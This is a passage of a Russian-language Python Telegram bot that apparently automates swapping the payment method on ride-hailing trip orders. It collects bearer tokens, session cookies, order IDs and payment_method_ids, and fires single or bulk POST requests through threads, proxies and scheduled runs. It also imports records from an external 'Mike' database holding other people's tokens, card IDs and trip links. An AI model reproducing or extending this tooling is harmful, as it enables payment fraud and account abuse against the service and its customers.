    orderid = update.message.text.strip()
    context.user_data["orderid"] = orderid

    await update.message.reply_text(
        "Принято. Теперь отправь, пожалуйста, <card> (payment_method_id):"
    )
    return ASK_CARD


@require_access
async def ask_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = update.message.text.strip()
    context.user_data["card"] = card

    await update.message.reply_text(
        "Отлично. Теперь отправь, пожалуйста, <id>:"
    )
    return ASK_ID


@require_access
async def ask_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _id = update.message.text.strip()
    context.user_data["id"] = _id

    await update.message.reply_text(
        "Все параметры сохранены ✅\n\n"
        "Теперь ты можешь:\n"
        "• Через «🎄💳 Поменять оплату» → «🎄🎯 Одиночная смена» — один POST-запрос.\n"
        "• Через «🎄💳 Поменять оплату» → «🎄🚀 Запустить потоки» — массовая отправка.\n"
        "• «🎄👤 Профиль» — статистика.\n"
        "• «🎄📜 Логи» — меню для выгрузки логов.\n"
        "• «🎄🚂 Загрузить поездки» — добавление и редактирование поездок.",
        reply_markup=main_keyboard(),
    )
    return MENU


@require_access
async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    if text == "🎄💳 Поменять оплату":
        await update.message.reply_text(
            "Выбери действие ⤵️:", reply_markup=actions_keyboard()
        )
        return MENU

    if text == "🎄🎯 Одиночная смена":
        proxy_state = proxy_state_text()
        await update.message.reply_text(
            "Окей, погнали. 🚀\n"
            f"Сейчас прокси: {proxy_state}\n\n"
            "Сначала отправь токен (только сам <token>, без Bearer):",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_TOKEN

    if text == "🎄🚀 Запустить потоки":
        await update.message.reply_text(
            "Выбери, как запускать потоки ⚙️:", reply_markup=stream_start_markup()
        )
        return MENU

    if text == "🎄🛑 Остановить потоки":
        stopped, completed, success, failed, session_id = await stop_streams_with_logging(
            update, context, reason="кнопка"
        )
        if stopped:
            await update.message.reply_text(
                "Окей, останавливаю потоки. ⛔ "
                f"Сессия: {session_id or '—'}. "
                f"Уже отправлено: {completed}. Успехов: {success}. Неуспехов: {failed}.",
                reply_markup=actions_keyboard(),
            )
        else:
            await update.message.reply_text(
                "Сейчас нет активной массовой отправки.",
                reply_markup=actions_keyboard(),
            )
        return MENU

    if text == "🎄🔙 Назад":
        await update.message.reply_text("Возвращаюсь в меню ↩️.", reply_markup=main_keyboard())
        return MENU

    if text == "🎄👤 Профиль":
        return await show_profile(update, context)

    if text == "🎄📜 Логи":
        await update.message.reply_text("Что показать? 📂", reply_markup=logs_keyboard())
        return MENU

    if text == "🎄📖 Посмотреть логи":
        await update.message.reply_text(
            "Введи ID сессии (5–7 цифр), лог которой хочешь получить:",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_LOG_SESSION_ID

    if text == "🎄🕒 Логи последней сессии":
        return await last_session_logs(update, context)

    if text == "🎄🚂 Загрузить поездки":
        return await show_trip_loader(update, context)

    await update.message.reply_text(
        "Не понял команду. Используй кнопки на клавиатуре.",
        reply_markup=main_keyboard(),
    )
    return MENU


@require_access
async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    total_requests = get_request_count_for_user(tg_id)
    last_session_id = context.user_data.get("last_session_id")
    proxy_state = proxy_state_text()

    msg = (
        f"🎄👤 Профиль\n\n"
        f"TG ID: <code>{html.escape(str(tg_id))}</code>\n"
        f"Всего отправлено запросов: <b>{total_requests}</b>\n"
        f"Прокси: {proxy_state}\n"
    )

    if last_session_id:
        msg += f"\nПоследний ID сессии: <code>{html.escape(str(last_session_id))}</code>\n"

    msg += "\nКнопка «🎄🕒 Логи последней сессии» сразу скинет .txt по последней сессии."

    await update.message.reply_text(
        msg,
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MENU


async def send_mike_orders_list(chat, tg_id: int):
    orders = fetch_mike_orders()

    if not os.path.exists(MIKE_DB_PATH):
        await chat.reply_text(
            "Файл базы из Майка не найден. Проверь путь: " f"{MIKE_DB_PATH}",
            reply_markup=main_keyboard(),
        )
        return False

    if not orders:
        await chat.reply_text(
            "Не удалось прочитать поездки из Майка или таблица пуста.",
            reply_markup=main_keyboard(),
        )
        return False

    keyboard = [
        [
            InlineKeyboardButton(
                order.get("created_at") or f"Запись #{order['row_id']}",
                callback_data=f"mike:item:{order['row_id']}",
            )
        ]
        for order in orders
    ]

    await chat.reply_text(
        "Выбери поездку из базы Майка:",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

    return True


@require_access
async def mike_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)

    await send_mike_orders_list(query.message, update.effective_user.id)
    return MENU


@require_access
async def mike_item_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)

    try:
        _, _, row_id_str = query.data.split(":", 2)
        row_id = int(row_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text(
            "Не понял, какую запись открыть.", reply_markup=main_keyboard()
        )
        return MENU

    order = fetch_mike_order_by_id(row_id)
    if not order:
        await query.message.reply_text(
            "Не смог получить данные этой записи из Майка.",
            reply_markup=main_keyboard(),
        )
        return MENU

    text_lines = [
        f"🆔 Запись: {order.get('row_id')}",
        f"🏷️ Название: {order.get('created_at') or '—'}",
        f"🔑 token2: {order.get('token2') or '—'}",
        f"🪪 ID: {order.get('order_id_primary') or '—'}",
        f"💳 card-x: {order.get('card') or '—'}",
        f"📄 orderid: {order.get('orderid') or '—'}",
        f"🔗 Ссылка: {order.get('trip_link') or '—'}",
    ]

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "➕ Добавить в мои поездки",
                    callback_data=f"mike:add:{order['row_id']}",
                )
            ],
            [InlineKeyboardButton("↩️ Назад", callback_data="mike:list")],
        ]
    )

    await query.message.reply_text("\n".join(text_lines), reply_markup=keyboard)
    return MENU


@require_access
async def mike_add_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)

    try:
        _, _, row_id_str = query.data.split(":", 2)
        row_id = int(row_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text(
            "Не понял, какую запись добавить.", reply_markup=main_keyboard()
        )
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await query.message.reply_text(
            "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
        )
        return MENU

    order = fetch_mike_order_by_id(row_id)
    if not order:
        await query.message.reply_text(
            "Не удалось прочитать запись из базы Майка.",
            reply_markup=main_keyboard(),
        )
        return MENU

    trip_id = import_mike_order_to_trip(order, tg_id)
    if not trip_id:
        await query.message.reply_text(
            "Не смог добавить поездку.", reply_markup=main_keyboard()
        )
        return MENU

    await query.message.reply_text(
        "Поездка добавлена в твой список.", reply_markup=main_keyboard()
    )
    return MENU


@require_access
async def ask_threads_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        threads = int(text)
        if threads <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное число потоков."
            " Можешь снова ввести число или нажать любую кнопку меню.",
            reply_markup=main_keyboard(),
        )
        return MENU

    context.user_data["threads"] = threads
    await update.message.reply_text(
        "Ок. Сколько всего запросов нужно отправить?",
    )
    return ASK_TOTAL_REQUESTS


@require_access
async def ask_total_requests_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        total_requests = int(text)
        if total_requests <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное число запросов."
            " Можешь снова ввести число или нажать любую кнопку меню.",
            reply_markup=main_keyboard(),
        )
        return MENU

    threads = context.user_data.get("threads")
    if not threads:
        await update.message.reply_text(
            "Что-то пошло не так с количеством потоков. Начни заново.",
            reply_markup=main_keyboard(),
        )
        return MENU

    context.user_data["threads"] = threads
    context.user_data["pending_bulk"] = {
        "threads": threads,
        "total": total_requests,
    }

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Запустить сейчас", callback_data="bulkstart:now")],
            [InlineKeyboardButton("Запустить через", callback_data="bulkstart:delay")],
        ]
    )
    await update.message.reply_text(
        "Когда запускать потоки?", reply_markup=keyboard
    )
    return ASK_SCHEDULE_DELAY


@require_access
async def bulk_schedule_choice_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    query = update.callback_query
    await query.answer()

    pending = context.user_data.get("pending_bulk") or {}
    try:
        _, choice = query.data.split(":", 1)
    except Exception:  # noqa: BLE001
        choice = ""

    if not pending:
        await query.message.reply_text(
            "Не нашёл сохранённые параметры. Начни заново.",
            reply_markup=main_keyboard(),
        )
        return MENU

    if choice == "now":
        await delete_callback_message(query)
        threads = int(pending.get("threads", context.user_data.get("threads", 1)))
        total_requests = int(pending.get("total", 0))
        await query.message.reply_text(
            "Запускаю массовую отправку прямо сейчас...",
            reply_markup=ReplyKeyboardRemove(),
        )
        await bulk_change_payment(update, context, threads, total_requests)
        context.user_data.pop("pending_bulk", None)
        return MENU

    if choice == "delay":
        context.user_data["waiting_delay"] = True
        await query.message.reply_text(
            "Через сколько минут запустить? Введи число.",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_SCHEDULE_DELAY

    await query.message.reply_text("Не понял выбор.", reply_markup=main_keyboard())
    return MENU


@require_access
async def bulk_schedule_delay_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pending = context.user_data.get("pending_bulk") or {}
    if not pending:
        await update.message.reply_text(
            "Не вижу сохранённых данных. Начни заново.", reply_markup=main_keyboard()
        )
        return MENU

    text = update.message.text.strip()
    try:
        minutes = int(text)
        if minutes < 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Укажи количество минут цифрами (0 или больше).",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_SCHEDULE_DELAY

    threads = int(pending.get("threads", context.user_data.get("threads", 1)))
    total_requests = int(pending.get("total", 0))
    context.user_data["waiting_delay"] = False

    await update.message.reply_text(
        f"Запланировал запуск через {minutes} мин. Сообщу о старте.",
        reply_markup=main_keyboard(),
    )

    async def delayed_start():
        await asyncio.sleep(minutes * 60)
        await update.message.reply_text(
            "Запускаю запланированную массовую отправку...",
            reply_markup=ReplyKeyboardRemove(),
        )
        await bulk_change_payment(update, context, threads, total_requests)

    context.application.create_task(delayed_start())
    context.user_data.pop("pending_bulk", None)
    return MENU


@require_access
async def ask_log_session_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    session_id = update.message.text.strip()

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    if not (session_id.isdigit() and 5 <= len(session_id) <= 7):
        await update.message.reply_text(
            "ID сессии должен быть из 5–7 цифр. Попробуй ещё раз или нажми любую кнопку.",
            reply_markup=main_keyboard(),
        )
        return MENU

    path = export_session_logs_to_file(tg_id, session_id)
    if path is None:
        await update.message.reply_text(
            f"Логи для сессии {session_id} не найдены.",
            reply_markup=main_keyboard(),
        )
        return MENU

    try:
        with open(path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=f"logs_{session_id}.txt"),
                caption=f"Логи для сессии {session_id}",
            )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    await update.message.reply_text(
        "Готово ✅",
        reply_markup=main_keyboard(),
    )
    return MENU


@require_access
async def last_session_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    session_id = context.user_data.get("last_session_id")
    if not session_id:
        await update.message.reply_text(
            "У тебя пока нет последней сессии (ещё не отправлял запросы).",
            reply_markup=main_keyboard(),
        )
        return MENU

    path = export_session_logs_to_file(tg_id, session_id)
    if path is None:
        await update.message.reply_text(
            f"Логи для последней сессии {session_id} не найдены.",
            reply_markup=main_keyboard(),
        )
        return MENU

    try:
        with open(path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=f"logs_{session_id}.txt"),
                caption=f"Логи для последней сессии {session_id}",
            )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    await update.message.reply_text(
        "Готово ✅",
        reply_markup=main_keyboard(),
    )
    return MENU


@require_access
async def change_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Один запрос (отдельная сессия).
    """
    user = update.effective_user
    tg_id = user.id if user else 0

    user_token = context.user_data.get("token")
    session_cookie = context.user_data.get("session_cookie")
    orderid = context.user_data.get("orderid")
    card = context.user_data.get("card")

    _id = context.user_data.get("id")

    if not ((user_token or session_cookie) and orderid and card and _id):
        await update.message.reply_text(
            "🎄 Похоже, какие-то параметры не заданы. Нажми «🎄💳 Поменять оплату» и введи данные заново.",
            reply_markup=main_keyboard(),
        )
        return MENU

    session_id = generate_session_id()
    context.user_data["last_session_id"] = session_id

    use_proxies = proxies_enabled()
    proxy_state = proxy_state_text()

    await update.message.reply_text(
        f"Отправляю запрос... ⏳\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Прокси: {proxy_state}",
        parse_mode="HTML",
    )

    headers = build_headers(user_token, session_cookie)
    payload = build_payload(orderid, card, _id)

    ok, status_code, response_text = await do_single_request_and_log(
        tg_id, headers, payload, session_id, use_proxies
    )

    if response_text is None:
        response_text = ""

    max_len = 1500
    sliced_response = response_text[:max_len] + (
        "\n\n[ответ обрезан]" if len(response_text) > max_len else ""
    )
    body_text = html.escape(sliced_response)

    if ok:
        msg = (
            f"✅ Запрос отправлен.\n"
            f"ID сессии: <code>{session_id}</code>\n"
            f"Прокси: {proxy_state}\n\n"
            f"Статус: {status_code}\n"
            f"Тело ответа:\n<pre>{body_text}</pre>"
        )
    else:
        msg = (
            f"❌ Не удалось отправить запрос.\n"
            f"ID сессии: <code>{session_id}</code>\n"
            f"Прокси: {proxy_state}\n"
            f"Статус: {status_code}\n"
            f"Подробности:\n<pre>{body_text}</pre>"
        )

    await update.message.reply_text(
        msg, parse_mode="HTML", reply_markup=main_keyboard()
    )
    return MENU


async def bulk_change_payment(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    threads: int,
    total_requests: int,
):
    """
    Массовая отправка: threads — одновременные запросы,
    total_requests — сколько всего логических запросов сделать.
    Добавлена честная задержка 300 мс между запросами, бэкофф на 429/5xx и
    корректная остановка.
    """
    user = update.effective_user
    tg_id = user.id if user else 0
    chat_id = update.effective_chat.id

    active_stop: Optional[asyncio.Event] = context.user_data.get("stop_event")
    if isinstance(active_stop, asyncio.Event) and not active_stop.is_set():
        await safe_reply(
            update,
            context,
            "🎄 У тебя уже идёт массовая отправка. Дождись окончания или нажми"
            " «Остановить потоки».",
            reply_markup=main_keyboard(),
        )
        return

    user_token = context.user_data.get("token")
    session_cookie = context.user_data.get("session_cookie")
    orderid = context.user_data.get("orderid")
    card = context.user_data.get("card")

    _id = context.user_data.get("id")

    if not ((user_token or session_cookie) and orderid and card and _id):
        await safe_reply(
            update,
            context,
            "🎄 Параметры не заданы полностью. Нажми «🎄💳 Поменять оплату» и введи данные.",
            reply_markup=main_keyboard(),
        )
        return

    use_proxies = proxies_enabled()
    proxy_state = proxy_state_text()

    headers = build_headers(user_token, session_cookie)
    payload = build_payload(orderid, card, _id)

    session_id = generate_session_id()
    context.user_data["last_session_id"] = session_id

    await safe_reply(
        update,
        context,
        f"🎄 Запускаю массовую отправку.\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Потоки (одновременных запросов): {threads}\n"
        f"Всего логических запросов: {total_requests}\n"
        f"Прокси: {proxy_state}\n\n"
        f"Каждые 5 секунд буду присылать лог (headers, body, последний ответ).\n"
        f"Чтобы остановить — нажми «🎄🛑 Остановить потоки».",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )

    progress = {
        "completed": 0,
        "success": 0,
        "last_status": None,
        "last_response": "",
    }

    stop_event = asyncio.Event()
    context.user_data["stop_event"] = stop_event
    context.user_data["active_session"] = {
        "session_id": session_id,
        "progress": progress,
    }

    async def progress_cb(
        completed: int, success: int, status: int, response: Optional[str]
    ):
        progress["completed"] = completed
        progress["success"] = success
        progress["last_status"] = status
        if response:
            max_len = 800
            sliced = response[:max_len] + (
                "\n\n[ответ обрезан]" if len(response) > max_len else ""
            )
            progress["last_response"] = html.escape(sliced)

    async def reporter():
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break

            msg = (
                f"📊 Промежуточный лог\n"
                f"ID сессии: <code>{session_id}</code>\n"
                f"Выполнено логических запросов: {progress['completed']} из {total_requests}\n"
                f"Успешных: {progress['success']}\n"
                f"Последний статус: {progress['last_status']}\n"
                f"Прокси: {proxy_state}\n\n"
                f"<b>Headers</b>:\n<pre>{html.escape(json.dumps(headers, ensure_ascii=False, indent=2))}</pre>\n"
                f"<b>Body</b>:\n<pre>{html.escape(json.dumps(payload, ensure_ascii=False, indent=2))}</pre>\n"
                f"<b>Последний ответ</b>:\n<pre>{progress['last_response']}</pre>"
            )
            try:
                await context.bot.send_message(
                    chat_id=chat_id, text=msg, parse_mode="HTML"
                )
            except Exception as e:  # noqa: BLE001
                logger.warning("Ошибка отправки репорта: %s", e)

    reporter_task = asyncio.create_task(reporter())

    completed, success = await session_service.run_bulk(
        tg_id=tg_id,
        headers=headers,
        payload=payload,
        use_proxies=use_proxies,
        total_requests=total_requests,
        concurrency=threads,
        session_id=session_id,
        progress_cb=progress_cb,
        stop_event=stop_event,
    )

    stop_event.set()
    context.user_data.pop("stop_event", None)
    context.user_data.pop("active_session", None)
    try:
        await reporter_task
    except Exception:
        pass

    failed = completed - success

    await safe_reply(
        update,
        context,
        f"🎄 Массовая отправка завершена (или остановлена).\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Прокси: {proxy_state}\n"
        f"Успешных логических запросов: {success}\n"
        f"Неуспешных: {failed}\n"
        f"Всего попыток: {completed} из запланированных {total_requests}",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Диалог завершён. Чтобы начать сначала — отправь /start.",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ConversationHandler.END

def build_application() -> "Application":
    init_db()
    load_proxies()

    bot = ResilientExtBot(token=BOT_TOKEN)
    app = ApplicationBuilder().bot(bot).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("request", request_restart))

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_ACCESS_TOKEN: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, access_token_handler
                )
            ],
            ASK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_token)],
            ASK_ORDERID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_orderid)],
            ASK_CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_card)],
            ASK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_id)],
            MENU: [
                CallbackQueryHandler(tripfield_callback, pattern="^tripfield:"),
                CallbackQueryHandler(trip_save_callback, pattern="^tripsave:"),
                CallbackQueryHandler(trip_clear_callback, pattern="^tripclear:"),
                CallbackQueryHandler(trip_load_choice_callback, pattern="^tripload:"),
                CallbackQueryHandler(streams_option_callback, pattern="^streams:"),
                CallbackQueryHandler(trip_select_callback, pattern="^tripselect:"),
                CallbackQueryHandler(trip_manage_callback, pattern="^tripmanage:"),
                CallbackQueryHandler(trip_new_callback, pattern="^tripnew:"),
                CallbackQueryHandler(trip_edit_callback, pattern="^tripedit:"),
                CallbackQueryHandler(trip_delete_callback, pattern="^tripdelete:"),
                CallbackQueryHandler(trip_use_callback, pattern="^tripuse:"),
                CallbackQueryHandler(start_choice_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, menu_handler),
            ],
            ASK_THREADS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_threads_handler)
            ],
            ASK_TOTAL_REQUESTS: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, ask_total_requests_handler
                )
            ],
            ASK_LOG_SESSION_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_log_session_handler)
            ],
            ASK_TRIP_VALUE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, trip_value_handler)
            ],
            ASK_STREAM_TOKEN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_token_handler)
            ],
            ASK_STREAM_ORDERID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_orderid_handler)
            ],
            ASK_STREAM_CARD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_card_handler)
            ],
            ASK_STREAM_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_id_handler)
            ],
            ASK_STREAM_THREADS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_threads_handler)
            ],
            ASK_STREAM_TOTAL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, stream_total_handler)
            ],
            ASK_TRIP_TEXT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, trip_text_input_handler)
            ],
            ASK_SCHEDULE_DELAY: [
                CallbackQueryHandler(
                    bulk_schedule_choice_callback, pattern="^bulkstart:"
                ),
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, bulk_schedule_delay_input
                ),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),  # <--- добавили
            CommandHandler("request", request_restart),
        ],
        per_message=False,
    )

    app.add_handler(conv)
    return app


def run_bot_with_restart():
    stop_signals = (
        (signal.SIGINT, signal.SIGTERM)
        if threading.current_thread() is threading.main_thread()
        else ()
    )

    while True:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        app = build_application()
        try:
            # Явно создаём и устанавливаем новый цикл событий перед запуском,
            # чтобы избежать "There is no current event loop" даже при старте в отдельном потоке.
            app.run_polling(stop_signals=stop_signals or None)
        except KeyboardInterrupt:
            logger.info("Бот остановлен вручную.")
            break
        except Conflict:
            logger.error("Найден другой активный инстанс бота (409 Conflict). Останавливаемся без рестарта.")
            break
        except Exception:
            logger.exception(
                "Бот упал с ошибкой. Перезапуск через 5 секунд...", exc_info=True
            )
            try:
                asyncio.run(app.shutdown())
            except Exception:
                logger.debug(
                    "Не удалось корректно завершить приложение после сбоя",
                    exc_info=True,
                )
            time.sleep(5)
        else:
            break
        finally:
            asyncio.set_event_loop(None)
            loop.close()


def main():
    """Запустить Telegram-бот с автоматическим рестартом."""
    run_bot_with_restart()


if __name__ == "__main__":
    run_bot_with_restart()
